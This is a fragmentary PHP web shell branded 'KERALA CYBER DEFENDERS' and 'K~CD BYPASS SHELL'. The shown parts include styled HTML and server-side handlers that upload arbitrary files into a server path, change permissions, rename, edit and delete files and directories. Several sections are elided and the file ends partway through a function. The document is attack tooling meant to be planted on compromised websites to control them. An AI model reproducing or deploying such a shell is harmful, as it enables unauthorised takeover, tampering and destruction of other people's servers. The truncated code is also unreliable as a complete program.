...
<html>
<head>
<title>KCD~P61V3T~SHELL</title>
<link href="https://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<style type="text/css">
body { font-family: Orbitron; background-color: black; background:black url("https://b.top4top.io/p_3073uyxmc0.jpg") center right no-repeat; }
#content tr:hover{
...
h1 { color:white; font-size: 50px; font-family: Orbitron; text-align: center; text-shadow: 0px 0px 5px rgb(255, 0, 0); font-weight: bold; letter-spacing: 5px; }
table, th, td {
...
<a href="?"><h1> KERALA CYBER DEFENDERS </h1></a> 
<center><img src="https://a.top4top.io/p_3073gqml40.png" alt="shell" height="250" width="250"></center>   
<BODY>
...
<input type="submit" value="UPLOAD" style="margin-top:4px;width:100px;height:27px;font-family:Orbitron;font-size:15;background:black;color: white;border:2px solid white;border-radius:5px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="white">Upload successfull</font><br/>';
}else{
...
echo '<br><br><font color="white">Successfully Changed the Permission</font><br/>';
}else{
echo '<script>alert("Failed to change permission")</script>';
}
}
...
echo '<br><br><font color="white">Name Changed Scuccessfully</font><br/>';
}else{
...
echo '<br><br><font color="white">Edit Success</font><br/>';
}else{
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<br><br><font color="white">Successfully Deleted</font><br/>';
}else{
...
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Orbitron;font-size:15;background:black;color:white;border:2px solid white;border-radius:5px\">
...
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Orbitron;font-size:15;background:black;color:white;border:2px solid white;border-radius:5px\"/>
</form></center></td>
</tr>";
}
...
echo '<center><br/><font face="Orbitron" color="white" style="text-shadow:0 0 5px white; font-weight:bold: white; font-size:15px; letter-spacing: 5px;"> K~CD BYPASS SHELL @2024 </center>
</body>
</html>';
function perms($file){
